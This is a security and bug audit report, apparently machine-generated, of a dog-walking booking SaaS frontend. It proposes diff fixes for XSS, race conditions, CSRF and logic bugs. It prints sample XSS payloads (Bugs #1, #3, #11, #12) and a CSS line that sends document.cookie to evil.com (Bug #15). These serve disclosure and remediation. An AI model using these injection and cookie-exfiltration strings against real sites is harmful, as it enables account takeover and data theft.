# Bug Report: frontend/js

**Analysis Date:** 2025-12-27
**Directory Analyzed:** `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js`
**Files Analyzed:** 14 files
**Bugs Found:** 15 bugs

---

## Summary

Analysis of the frontend JavaScript directory revealed 15 functional bugs across security, error handling, logic errors, and API issues. The most critical issues include:

- **Critical Security:** XSS vulnerability in dog photo helpers (inline event handlers with unsanitized IDs)
- **High Severity:** Race condition in auth guard checks, localStorage XSS vector, missing error handling
- **Medium Severity:** Incomplete API endpoint, logic errors in tour detection, prompt-based UX issues

The codebase shows good security practices in many areas (sanitization helpers, CSP compliance), but several gaps remain that could lead to security vulnerabilities or functional failures.

---

## Bugs

## Bug #1: XSS Vulnerability via Inline Event Handler in Dog Photo HTML

**Severity:** CRITICAL

**Description:**
The `getDogPhotoHtml()` function in `dog-photo-helpers.js` generates inline event handlers (`onload="handleImageLoad('${uniqueId}')"`) where `uniqueId` includes a sanitized `dog.id`. However, the sanitization uses `escapeForAttribute()` which escapes HTML entities but doesn't prevent JavaScript context injection. An attacker who can control `dog.id` (e.g., through database injection or API manipulation) could inject malicious JavaScript that executes when the image loads.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/dog-photo-helpers.js`
- Function: `getDogPhotoHtml`
- Lines: 79-102

**Example Attack Vector:**
```javascript
// Malicious dog.id value:
dog.id = "1'); alert('XSS'); //";

// Generated HTML becomes:
onload="handleImageLoad('1'); alert('XSS'); //')"

// Result: XSS execution when image loads
```

**Steps to Reproduce:**
1. Inject a malicious `dog.id` value through API or database
2. Load a page that displays dog photos (dogs.html, dashboard.html)
3. When the dog photo loads, the inline handler executes the injected JavaScript
4. Expected: Safe rendering | Actual: JavaScript execution

**Fix:**
Remove inline event handlers entirely (CSP violation anyway) and use event delegation:

```diff
- function getDogPhotoHtml(dog, useThumbnail = false, className = 'dog-card-image', lazyLoad = true, withSkeleton = true) {
-     const uniqueId = `dog-img-${safeId}`;
-     if (withSkeleton && !isSvgPlaceholder) {
-         return `<div class="dog-card-image-container" id="container-${uniqueId}">
-                     <img src="${photoUrl}"
-                          alt="${altText}"
-                          class="${className}"
-                          id="${uniqueId}"
-                          ${loadingAttr}
-                          onload="handleImageLoad('${uniqueId}')">
-                 </div>`;
-     }
-     return `<img src="${photoUrl}" alt="${altText}" class="${className}"${loadingAttr}>`;
- }
+ function getDogPhotoHtml(dog, useThumbnail = false, className = 'dog-card-image', lazyLoad = true, withSkeleton = true) {
+     const safeId = escapeForAttribute(dog.id) || Math.random().toString(36).substring(2, 11);
+     const uniqueId = `dog-img-${safeId}`;
+     if (withSkeleton && !isSvgPlaceholder) {
+         return `<div class="dog-card-image-container" data-img-id="${uniqueId}">
+                     <img src="${photoUrl}"
+                          alt="${altText}"
+                          class="${className} skeleton-img"
+                          data-img-id="${uniqueId}"
+                          ${loadingAttr}>
+                 </div>`;
+     }
+     return `<img src="${photoUrl}" alt="${altText}" class="${className}"${loadingAttr}>`;
+ }
+
+ // Add event delegation in event-handlers.js or separate init function
+ document.addEventListener('load', function(e) {
+     if (e.target.tagName === 'IMG' && e.target.hasAttribute('data-img-id')) {
+         const imgId = e.target.getAttribute('data-img-id');
+         handleImageLoad(imgId);
+     }
+ }, true);
```

---

## Bug #2: Race Condition in Admin/Super-Admin Authorization Check

**Severity:** HIGH

**Description:**
The `auth-guard.js` script performs asynchronous admin privilege checks via `api.getMe()`, but the page continues loading and rendering while the API call is in flight. This creates a race condition where protected admin content may briefly flash to unauthorized users before the redirect occurs. Additionally, there's no loading overlay during the check, violating the code's own comment recommendation.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/auth-guard.js`
- Function: IIFE (lines 42-61)
- Lines: 42-61

**Steps to Reproduce:**
1. Access an admin page (e.g., `/admin-dashboard.html`) as a regular user with valid JWT
2. The auth guard allows initial token check to pass (line 32)
3. Page begins rendering admin UI
4. API call to `/users/me` is made (line 47)
5. For 100-500ms, admin content is visible
6. Then redirect to `/dashboard.html` occurs
7. Expected: No admin content visible | Actual: Brief flash of admin UI

**Fix:**
Implement blocking check with loading overlay:

```diff
  // If admin check is required, we need to verify with the server
  if (requireAdmin || requireSuperAdmin) {
-     // Create a synchronous check by blocking with a promise
-     // Note: This is handled asynchronously, page may briefly show
-     // Consider using a loading overlay for better UX
+     // Show loading overlay immediately
+     document.body.style.display = 'none';
+     const loader = document.createElement('div');
+     loader.id = 'auth-check-loader';
+     loader.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:9999;';
+     loader.innerHTML = '<div style="color:white;font-size:20px;">Überprüfe Berechtigung...</div>';
+     document.body.appendChild(loader);

-     api.getMe().then(function(user) {
+     api.getMe().then(function(user) {
          if (requireSuperAdmin && !user.is_super_admin) {
              console.warn('AuthGuard: Super admin access required');
              window.location.href = '/dashboard.html';
          } else if (requireAdmin && !user.is_admin) {
              console.warn('AuthGuard: Admin access required');
              window.location.href = '/dashboard.html';
+         } else {
+             // Authorized - show page
+             document.body.style.display = '';
+             if (loader.parentNode) loader.remove();
          }
      }).catch(function(error) {
          console.error('AuthGuard: Failed to verify user:', error);
          // Token might be invalid - redirect to login
          api.setToken(null);
          window.location.href = '/login.html';
      });
  }
```

---

## Bug #3: localStorage XSS Vector in Sanitization

**Severity:** HIGH

**Description:**
The `sanitizeHTML()` function in `sanitize.js` creates a temporary DOM element to escape HTML entities, but localStorage data (language preference, tour completion flags, tokens) is never sanitized before being inserted into the DOM. An attacker who can inject malicious data into localStorage (via XSS on another page or malicious browser extension) can achieve persistent XSS when that data is displayed.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/sanitize.js`
- Function: `sanitizeHTML`
- Lines: 11-18
- Related: `i18n.js` (localStorage usage), `api.js` (token storage)

**Steps to Reproduce:**
1. Inject malicious payload into localStorage via another vulnerability:
   ```javascript
   localStorage.setItem('gassigeher_language', '<img src=x onerror="alert(1)">');
   ```
2. Load any page that uses i18n system
3. The locale string is read from localStorage and used unsanitized
4. If displayed in UI (e.g., language selector), XSS executes
5. Expected: Escaped output | Actual: Script execution

**Fix:**
Sanitize ALL localStorage reads before DOM insertion:

```diff
  // In i18n.js constructor
  constructor(locale = null) {
-     this.locale = locale || localStorage.getItem('gassigeher_language') || 'de';
+     const storedLocale = localStorage.getItem('gassigeher_language');
+     // Validate locale against whitelist
+     this.locale = locale || (this.availableLocales.includes(storedLocale) ? storedLocale : 'de');
      this.translations = {};
      this.availableLocales = ['de', 'en'];
```

```diff
  // In api.js constructor
  constructor() {
      this.baseURL = '/api/v1';
-     this.token = localStorage.getItem('gassigeher_token');
+     // Validate token format (JWT has 3 base64 segments separated by dots)
+     const storedToken = localStorage.getItem('gassigeher_token');
+     if (storedToken && /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(storedToken)) {
+         this.token = storedToken;
+     } else {
+         this.token = null;
+         localStorage.removeItem('gassigeher_token');
+     }
  }
```

---

## Bug #4: Missing Error Handling in API Request Method

**Severity:** HIGH

**Description:**
The `api.request()` method in `api.js` catches errors but immediately re-throws them without adding context or handling network failures gracefully. This causes unhandled promise rejections throughout the application when network requests fail, leading to silent failures and poor user experience.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/api.js`
- Function: `request`
- Lines: 47-91

**Steps to Reproduce:**
1. Disconnect from network or block API requests in browser DevTools
2. Perform any API action (e.g., load dogs list)
3. JavaScript error appears in console: "Uncaught (in promise) TypeError: Failed to fetch"
4. No user-facing error message appears
5. Expected: User-friendly error message | Actual: Silent failure

**Fix:**
Add proper error handling with user feedback:

```diff
  async request(method, endpoint, data = null) {
      // ... existing code ...

      try {
          const response = await fetch(`${this.baseURL}${endpoint}`, options);
          // ... existing response handling ...
      } catch (error) {
+         // Network error or request blocked
+         if (error.name === 'TypeError' && error.message.includes('fetch')) {
+             const networkError = new Error('Netzwerkfehler: Bitte überprüfen Sie Ihre Internetverbindung');
+             networkError.isNetworkError = true;
+             networkError.originalError = error;
+             throw networkError;
+         }
+
+         // Timeout or abort
+         if (error.name === 'AbortError') {
+             const timeoutError = new Error('Anfrage dauerte zu lange');
+             timeoutError.isTimeout = true;
+             throw timeoutError;
+         }
+
          throw error;
      }
  }
```

---

## Bug #5: Incomplete API Endpoint - Dog Photo Removal Not Implemented

**Severity:** MEDIUM

**Description:**
The `dog-photo.js` module has a `promptRemovePhoto()` function that displays an alert saying photo removal must be implemented, but then does nothing. This is a half-implemented feature that confuses users - the UI suggests photo removal is possible (button exists), but clicking it shows an error message instead of removing the photo.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/dog-photo.js`
- Function: `promptRemovePhoto`
- Lines: 267-283

**Steps to Reproduce:**
1. As admin, go to admin-dogs.html
2. Edit a dog that has a photo
3. Click "Foto entfernen" button
4. Alert appears: "Foto-Entfernung muss noch über Backend-Endpoint implementiert werden"
5. Expected: Photo removed from dog | Actual: Nothing happens

**Fix:**
Either implement the feature or remove the button:

**Option A: Implement removal (requires backend endpoint)**
```diff
  async promptRemovePhoto() {
      if (!confirm('Möchten Sie das Foto wirklich entfernen?')) {
          return;
      }

-     // Note: This would require a DELETE endpoint which may not exist yet
-     // For now, we'll just alert that it's not implemented
-     alert('Foto-Entfernung muss noch über Backend-Endpoint implementiert werden');
-
-     // TODO: Implement when DELETE /api/v1/dogs/:id/photo endpoint is available
-     // try {
-     //     await api.removeDogPhoto(this.currentDogId);
-     //     // Refresh dog data
-     // } catch (error) {
-     //     alert('Fehler beim Entfernen des Fotos: ' + error.message);
-     // }
+     try {
+         // Use existing update endpoint with photo=null
+         await api.updateDog(this.currentDogId, { photo: null, photo_thumbnail: null });
+         // Hide current photo display
+         this.hideCurrentPhoto('current-photo-container');
+         // Show upload zone
+         const uploadZone = document.getElementById('photo-upload-zone');
+         if (uploadZone) uploadZone.style.display = 'block';
+         alert('Foto erfolgreich entfernt');
+     } catch (error) {
+         alert('Fehler beim Entfernen des Fotos: ' + error.message);
+     }
  }
```

**Option B: Remove the button until feature is implemented**
```diff
  displayCurrentPhoto(photoUrl, containerId) {
      // ...
      container.innerHTML = `
          <div class="current-photo-display">
              <img src="/uploads/${photoUrl}" alt="Current dog photo" class="current-dog-photo">
              <div class="photo-actions">
                  <button type="button" class="btn btn-small" onclick="dogPhotoManager.promptChangePhoto()">
                      Foto ändern
                  </button>
-                 <button type="button" class="btn btn-danger btn-small" onclick="dogPhotoManager.promptRemovePhoto()">
-                     Foto entfernen
-                 </button>
              </div>
          </div>
      `;
  }
```

---

## Bug #6: Router Query Parameter Parsing Doesn't Handle Empty Values

**Severity:** MEDIUM

**Description:**
The `getQueryParams()` method in `router.js` attempts to decode query parameters but doesn't properly handle edge cases like `?key=` (empty value) or `?key` (no equals sign). The try-catch for malformed URI only catches decoding errors, but doesn't validate the parsed result, leading to inconsistent parameter objects.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/router.js`
- Function: `getQueryParams`
- Lines: 75-94

**Steps to Reproduce:**
1. Navigate to URL with edge case params: `/login.html?redirect=&foo`
2. Call `router.getQueryParams()`
3. Result: `{ redirect: '', foo: '' }`
4. Expected: `{ redirect: '' }` (foo has no value and should be ignored or flagged)
5. Code consuming params doesn't know if `redirect` is intentionally empty or missing

**Fix:**
Improve parsing to handle edge cases:

```diff
  getQueryParams() {
      const params = {};
      const queryString = window.location.search.substring(1);
+     if (!queryString) return params;
+
      const pairs = queryString.split('&');

      for (const pair of pairs) {
+         if (!pair) continue; // Skip empty pairs from trailing &
          const [key, value] = pair.split('=');
-         if (key) {
+         if (key && key.trim()) {
              try {
-                 params[decodeURIComponent(key)] = decodeURIComponent(value || '');
+                 const decodedKey = decodeURIComponent(key.trim());
+                 // Only include parameters with explicit values (key=value)
+                 if (value !== undefined) {
+                     params[decodedKey] = decodeURIComponent(value);
+                 }
              } catch (e) {
                  // Handle malformed URI encoding gracefully
-                 params[key] = value || '';
+                 console.warn('Malformed query parameter:', key, value);
+                 params[key.trim()] = value || '';
              }
          }
      }

      return params;
  }
```

---

## Bug #7: Missing CSRF Protection for State-Changing Operations

**Severity:** MEDIUM

**Description:**
The API client does not implement CSRF (Cross-Site Request Forgery) protection for state-changing operations (POST, PUT, DELETE). While JWT authentication provides some protection, CSRF attacks can still occur if an attacker tricks a logged-in user into visiting a malicious page that makes authenticated requests using the victim's stored JWT token (if cookies are involved or if the token is accessible).

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/api.js`
- Function: `request`
- Lines: 29-91

**Steps to Reproduce:**
1. User logs into application (JWT stored in localStorage)
2. Attacker creates malicious page: `evil.com/attack.html`
3. Attack page includes JavaScript that reads JWT from opener window (if same-origin) or uses other vectors
4. Attack page makes POST request to `/api/v1/bookings` with stolen token
5. Expected: Request rejected | Actual: Booking created

**Fix:**
Implement CSRF token system (requires backend support):

```diff
  class API {
      constructor() {
          this.baseURL = '/api/v1';
          this.token = localStorage.getItem('gassigeher_token');
+         this.csrfToken = null;
+         this.initCSRF();
      }
+
+     async initCSRF() {
+         try {
+             const response = await fetch('/api/v1/csrf-token');
+             const data = await response.json();
+             this.csrfToken = data.token;
+         } catch (error) {
+             console.warn('Failed to fetch CSRF token:', error);
+         }
+     }

      async request(method, endpoint, data = null) {
          const headers = {
              'Content-Type': 'application/json',
          };

          if (this.token) {
              headers['Authorization'] = `Bearer ${this.token}`;
          }
+
+         // Add CSRF token for state-changing operations
+         if (['POST', 'PUT', 'DELETE', 'PATCH'].includes(method) && this.csrfToken) {
+             headers['X-CSRF-Token'] = this.csrfToken;
+         }

          // ... rest of method
      }
  }
```

**Note:** This requires backend implementation of CSRF token generation and validation.

---

## Bug #8: Shepherd Tour Detection Logic Incorrect for Demo Tenant

**Severity:** MEDIUM

**Description:**
The `isDemoTenant()` function in `shepherd-tour.js` checks if hostname starts with "demo." but also checks for exact match "demo.gassigeher.org". This is inconsistent - the second check will never match because `startsWith('demo.')` already catches it. More importantly, if the base domain is different (e.g., "gassigeher.com"), the check fails. The function should use the actual BASE_DOMAIN from server config.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/shepherd-tour.js`
- Function: `isDemoTenant`
- Lines: 28-35

**Steps to Reproduce:**
1. Deploy application with BASE_DOMAIN=example.com
2. Access demo.example.com
3. Tour should always show (demo tenant behavior)
4. `isDemoTenant()` returns false because hostname is not "demo.gassigeher.org"
5. If user completes tour, it won't show again
6. Expected: Tour always shows on demo tenant | Actual: One-time tour

**Fix:**
Check subdomain correctly regardless of base domain:

```diff
  function isDemoTenant() {
-     // Check subdomain or cached value
-     const hostname = window.location.hostname;
-     if (hostname.startsWith('demo.') || hostname === 'demo.gassigeher.org') {
-         return true;
-     }
-     return localStorage.getItem(STORAGE_KEYS.isDemo) === 'true';
+     // Check subdomain or cached value from server
+     const hostname = window.location.hostname;
+     const parts = hostname.split('.');
+
+     // Check if first subdomain is 'demo' (works for any base domain)
+     if (parts.length >= 2 && parts[0] === 'demo') {
+         return true;
+     }
+
+     // Fallback to server-provided flag
+     return localStorage.getItem(STORAGE_KEYS.isDemo) === 'true';
  }
```

---

## Bug #9: Race Condition in Shepherd Tour Auto-Initialization

**Severity:** MEDIUM

**Description:**
The tour system auto-initializes via `DOMContentLoaded` or setTimeout if DOM is already loaded. However, it checks for element existence AFTER starting the tour (lines 321-330). If elements are being dynamically loaded (e.g., via async API calls to populate navigation), the tour may fail to attach to elements or attach to wrong elements. The 500ms delay is arbitrary and may not be sufficient for slow API responses.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/shepherd-tour.js`
- Function: `initTour`
- Lines: 288-335

**Steps to Reproduce:**
1. Load dashboard on slow connection or with API delays
2. Navigation items populate after 600ms (slower than 500ms timeout)
3. Tour starts at 500ms before elements exist
4. Tour steps fail to attach to elements
5. Expected: Tour waits for elements | Actual: Tour starts prematurely

**Fix:**
Implement proper wait for critical elements:

```diff
  function initTour() {
      // ... determine which tour to show ...

      // Start tour after a short delay to ensure page is loaded
      if (tour) {
-         setTimeout(() => {
-             // Only start if elements exist
-             const firstStep = tour.steps[0];
-             if (firstStep && !firstStep.options.attachTo) {
-                 tour.start();
-             } else if (firstStep && firstStep.options.attachTo) {
-                 const el = document.querySelector(firstStep.options.attachTo.element);
-                 if (el || !firstStep.options.attachTo.element) {
-                     tour.start();
-                 }
-             }
-         }, 500);
+         // Wait for critical elements with timeout
+         const waitForElements = () => {
+             return new Promise((resolve) => {
+                 const checkInterval = setInterval(() => {
+                     // Check if navigation is loaded (critical for most tours)
+                     const nav = document.querySelector('nav');
+                     const hasLinks = nav && nav.querySelectorAll('a').length > 0;
+
+                     if (hasLinks) {
+                         clearInterval(checkInterval);
+                         resolve(true);
+                     }
+                 }, 100);
+
+                 // Timeout after 5 seconds
+                 setTimeout(() => {
+                     clearInterval(checkInterval);
+                     resolve(false);
+                 }, 5000);
+             });
+         };
+
+         waitForElements().then((ready) => {
+             if (ready) {
+                 tour.start();
+             } else {
+                 console.warn('Tour elements not ready, skipping tour');
+             }
+         });
      }

      return tour;
  }
```

---

## Bug #10: Nav Menu Toggle Function Logging Production Code

**Severity:** LOW

**Description:**
The `toggleMenu()` function in `nav-menu.js` contains excessive `console.log()` statements (lines 6, 9, 10, 14) that were clearly used for debugging but never removed. These logs execute on every menu toggle, polluting the browser console and potentially exposing internal state to users or attackers inspecting the console.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/nav-menu.js`
- Function: `toggleMenu`
- Lines: 5-18

**Steps to Reproduce:**
1. Open browser console on any page
2. Click hamburger menu icon
3. Console shows: "toggleMenu called", "nav element: ...", "overlay element: ...", "Toggled active class - nav now: OPEN"
4. Expected: Clean console | Actual: Debug logs

**Fix:**
Remove debug logging:

```diff
  function toggleMenu() {
-     console.log('toggleMenu called');
      const nav = document.getElementById('main-nav');
      const overlay = document.getElementById('nav-overlay');
-     console.log('nav element:', nav);
-     console.log('overlay element:', overlay);
      if (nav && overlay) {
          nav.classList.toggle('active');
          overlay.classList.toggle('active');
-         console.log('Toggled active class - nav now:', nav.classList.contains('active') ? 'OPEN' : 'CLOSED');
      } else {
          console.error('Could not find nav or overlay elements!');
      }
  }
```

Also remove debug logs at the end of the file (lines 48-51).

---

## Bug #11: Prompt-Based UX in Admin Booking Times

**Severity:** MEDIUM

**Description:**
The admin booking times page uses `prompt()` dialogs to collect input for adding new time rules and holidays (lines 161-212, 290-309). The `prompt()` function provides a poor user experience - no input validation, ugly browser-default styling, and blocks the UI. Additionally, user input from prompts is not sanitized before being sent to the API, creating a potential XSS vector if the backend echoes the data back unsanitized.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/admin-booking-times.js`
- Lines: 160-212 (add time rules), 290-309 (add holidays)

**Steps to Reproduce:**
1. As admin, go to admin-booking-times page
2. Click "Wochentag-Regel hinzufügen"
3. Browser shows ugly prompt() dialog
4. Enter `<script>alert('xss')</script>` as rule name
5. Data sent to API unsanitized
6. Expected: Modern modal with validation | Actual: Prompt dialog, no validation

**Fix:**
Replace prompts with proper modal forms:

```diff
- document.getElementById('add-weekday-rule-btn').addEventListener('click', async () => {
-     const ruleName = prompt('Name des Zeitfensters:');
-     if (!ruleName) return;
-
-     const startTime = prompt('Startzeit (HH:MM):', '09:00');
-     if (!startTime) return;
-
-     const endTime = prompt('Endzeit (HH:MM):', '12:00');
-     if (!endTime) return;
-
-     const isBlocked = confirm('Ist dieses Zeitfenster gesperrt?');
+ document.getElementById('add-weekday-rule-btn').addEventListener('click', () => {
+     showAddRuleModal('weekday');
+ });

+ function showAddRuleModal(dayType) {
+     const modal = document.createElement('div');
+     modal.className = 'modal';
+     modal.innerHTML = `
+         <div class="modal-content">
+             <h3>Zeitfenster hinzufügen (${dayType === 'weekday' ? 'Wochentag' : 'Wochenende'})</h3>
+             <form id="add-rule-form">
+                 <label>Name: <input type="text" name="ruleName" required maxlength="50"></label>
+                 <label>Startzeit: <input type="time" name="startTime" value="09:00" required></label>
+                 <label>Endzeit: <input type="time" name="endTime" value="12:00" required></label>
+                 <label>
+                     <input type="checkbox" name="isBlocked"> Zeitfenster gesperrt
+                 </label>
+                 <div class="modal-actions">
+                     <button type="submit" class="btn btn-primary">Hinzufügen</button>
+                     <button type="button" class="btn btn-secondary" onclick="this.closest('.modal').remove()">Abbrechen</button>
+                 </div>
+             </form>
+         </div>
+     `;
+     document.body.appendChild(modal);
+
+     modal.querySelector('form').addEventListener('submit', async (e) => {
+         e.preventDefault();
+         const formData = new FormData(e.target);
+
          try {
              await api.createBookingTimeRule({
-                 day_type: 'weekday',
-                 rule_name: ruleName,
-                 start_time: startTime,
-                 end_time: endTime,
-                 is_blocked: isBlocked
+                 day_type: dayType,
+                 rule_name: formData.get('ruleName').trim(),
+                 start_time: formData.get('startTime'),
+                 end_time: formData.get('endTime'),
+                 is_blocked: formData.has('isBlocked')
              });
              showAlert('success', 'Zeitfenster hinzugefügt!');
              loadTimeRules();
+             modal.remove();
          } catch (error) {
              showAlert('error', error.message || 'Fehler beim Hinzufügen');
          }
-     });
+     });
+ }
```

---

## Bug #12: Alert Container innerHTML Creates XSS Vector

**Severity:** HIGH

**Description:**
The `showAlert()` function in `admin-booking-times.js` directly inserts the message into `innerHTML` without sanitization (line 335). If the error message comes from user input or server response, this creates an XSS vulnerability. Error messages should always be treated as untrusted data.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/admin-booking-times.js`
- Function: `showAlert`
- Lines: 332-337

**Steps to Reproduce:**
1. Trigger an error that echoes user input (e.g., invalid time format)
2. Server returns error: `{"error": "<img src=x onerror=alert(1)>"}`
3. Frontend displays error via `showAlert('error', errorResponse.error)`
4. XSS payload executes via innerHTML
5. Expected: Escaped HTML | Actual: JavaScript execution

**Fix:**
Use textContent instead of innerHTML:

```diff
  function showAlert(type, message) {
      const container = document.getElementById('alert-container');
-     container.innerHTML = `<div class="alert alert-${type}">${message}</div>`;
+     container.innerHTML = ''; // Clear previous alerts
+     const alertDiv = document.createElement('div');
+     alertDiv.className = `alert alert-${type}`;
+     alertDiv.textContent = message; // Safe - uses textContent
+     container.appendChild(alertDiv);
      setTimeout(() => container.innerHTML = '', 5000);
  }
```

---

## Bug #13: API Import Template URL Typo

**Severity:** LOW

**Description:**
The `getImportTemplateUrl()` method in `api.js` references `this.baseUrl` (line 623) instead of `this.baseURL` (note capitalization). JavaScript is case-sensitive, so `this.baseUrl` is undefined, causing the method to return `undefined/admin/import/dogs/template` instead of the correct URL.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/api.js`
- Function: `getImportTemplateUrl`
- Lines: 622-624

**Steps to Reproduce:**
1. Call `api.getImportTemplateUrl()` from admin import page
2. Method returns: `"undefined/admin/import/dogs/template"`
3. Attempting to download template fails with 404
4. Expected: `"/api/v1/admin/import/dogs/template"` | Actual: `"undefined/..."`

**Fix:**
Correct the property name:

```diff
  getImportTemplateUrl() {
-     return `${this.baseUrl}/admin/import/dogs/template`;
+     return `${this.baseURL}/admin/import/dogs/template`;
  }
```

---

## Bug #14: Impersonation Banner Missing Auto-Initialize on Non-Protected Pages

**Severity:** MEDIUM

**Description:**
The `ImpersonationBanner` class is defined but never auto-initializes (no DOMContentLoaded listener in the file). The code comment says "Call this on page load for all protected pages" but doesn't actually do it. Pages must manually call `ImpersonationBanner.init()`, which is easy to forget, leading to inconsistent banner visibility during impersonation sessions.

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/impersonation-banner.js`
- Function: Class definition
- Lines: 1-126

**Steps to Reproduce:**
1. Super-admin impersonates a user
2. Navigate to a page that doesn't explicitly call `ImpersonationBanner.init()`
3. Impersonation banner doesn't appear
4. User may forget they're impersonating and take unintended actions
5. Expected: Banner on all pages | Actual: Missing on some pages

**Fix:**
Add auto-initialization like DemoBanner has:

```diff
  // Make it globally available
  window.ImpersonationBanner = ImpersonationBanner;
+
+ // Auto-initialize on DOMContentLoaded (only on protected pages)
+ document.addEventListener('DOMContentLoaded', () => {
+     // Only check if user is authenticated (has token)
+     if (window.api && window.api.isAuthenticated()) {
+         ImpersonationBanner.init();
+     }
+ });
```

---

## Bug #15: CSS Injection via Hex Code in Calendar Dog Cell

**Severity:** MEDIUM

**Description:**
The `getCalendarDogCell()` function in `dog-photo-helpers.js` uses `sanitizeHexCode()` to validate color hex codes, which is good. However, the function still uses inline styles with the hex code in multiple places (line 231). If `sanitizeHexCode()` has a bug or is bypassed, an attacker could inject CSS that breaks layout or hides elements. While not XSS, CSS injection can still cause denial of service or phishing attacks (e.g., hiding legitimate UI, overlaying fake login forms).

**Location:**
- File: `/home/tranmh/work/gassigeher-saas/internal/static/frontend/js/dog-photo-helpers.js`
- Function: `getCalendarDogCell`
- Lines: 206-248

**Impact:**
- Layout breakage via CSS injection: `hexCode = "red; position:fixed; top:0; left:0; width:100vw; height:100vh;"`
- While `sanitizeHexCode()` prevents this, defense in depth suggests avoiding inline styles

**Steps to Reproduce:**
1. If sanitization is bypassed, inject: `#fff; background:url('http://evil.com/log?cookie='+document.cookie)`
2. CSS attempts to exfiltrate data (modern browsers block this)
3. Or inject: `#fff); display:none; /* ` to hide UI elements
4. Expected: Sanitized color only | Actual: Potential CSS injection

**Fix:**
Use CSS classes instead of inline styles:

```diff
  function getCalendarDogCell(dog, color) {
      // ... existing code ...
      const safeHexCode = sanitizeHexCode(dogColor.hex_code);
+     // Create unique class name for this color
+     const colorClass = `color-${safeHexCode.substring(1)}`; // Remove # prefix
+
+     // Inject CSS rule if not exists
+     if (!document.getElementById(`style-${colorClass}`)) {
+         const style = document.createElement('style');
+         style.id = `style-${colorClass}`;
+         style.textContent = `
+             .badge-${colorClass} {
+                 background: ${safeHexCode}20;
+                 border: 1px solid ${safeHexCode};
+                 color: ${safeHexCode};
+             }
+         `;
+         document.head.appendChild(style);
+     }

      return `<div class="calendar-dog-name-cell">
          <img src="${photoUrl}" alt="${altText}" class="calendar-dog-photo" loading="lazy">
          <div>
              <div style="font-weight: 700; font-size: 1rem; color: var(--text-dark);">${safeDogName}</div>
-             <span style="display: inline-flex; align-items: center; gap: 3px; font-size: 0.7rem; padding: 2px 8px; background: ${safeHexCode}20; border: 1px solid ${safeHexCode}; color: ${safeHexCode}; border-radius: 4px; margin-top: 4px;">
+             <span class="badge badge-${colorClass}">
                  ${icon} ${safeColorName}
              </span>
          </div>
      </div>`;
  }
```

**Alternative:** Continue using inline styles but add CSP style-src directive to block unsafe-inline styles.

---

## Statistics

- **Critical:** 1 bug (XSS via inline event handler)
- **High:** 4 bugs (race condition in auth, localStorage XSS, missing error handling, alert innerHTML XSS)
- **Medium:** 9 bugs (incomplete feature, query parsing, CSRF missing, tour logic, race condition, prompt UX, impersonation init, CSS injection, API typo)
- **Low:** 1 bug (debug logging)

---

## Recommendations

### Immediate Actions (Critical/High)

1. **Remove all inline event handlers** - Use event delegation exclusively (CSP compliance + security)
2. **Implement auth guard loading overlay** - Prevent FOUC (Flash of Unauthorized Content)
3. **Sanitize all localStorage reads** - Validate against whitelists before use
4. **Add global error handler** - Catch unhandled promise rejections and show user-friendly messages
5. **Replace innerHTML with textContent** - For all user-controlled or server-response data

### Short-Term Improvements (Medium)

6. **Complete dog photo removal feature** - Or remove the button
7. **Replace prompt() with modals** - Better UX and input validation
8. **Add CSRF protection** - Implement token system for state-changing operations
9. **Fix Shepherd tour initialization** - Proper element waiting, correct demo tenant detection
10. **Auto-initialize impersonation banner** - Consistent visibility across all pages

### Long-Term Enhancements (Low/Architecture)

11. **Implement Content Security Policy** - Enforce no inline scripts/styles
12. **Add request timeout handling** - Better UX for slow connections
13. **Use CSS classes over inline styles** - Reduce injection surface
14. **Add unit tests for sanitization** - Prevent regressions
15. **Remove debug logging** - Clean production code

### Security Best Practices

- **Always sanitize before DOM insertion** - Use textContent or createElement
- **Validate all input** - Including localStorage, query params, API responses
- **Use event delegation** - Avoid inline handlers (onclick, onload, etc.)
- **Implement CSP** - Block inline scripts/styles entirely
- **Add CSRF tokens** - For all state-changing operations
- **Timeout API requests** - Prevent hung requests on slow networks
- **Whitelist validation** - For locale, tenant slugs, enums
- **Defense in depth** - Multiple layers of validation (client + server)

### Code Quality Improvements

- **Remove TODO comments** - Either implement or delete incomplete features
- **Consistent error handling** - Standardize error messages and user feedback
- **Replace prompt/confirm** - Use modern modal dialogs
- **Add JSDoc comments** - For all exported functions
- **TypeScript migration** - Consider for better type safety
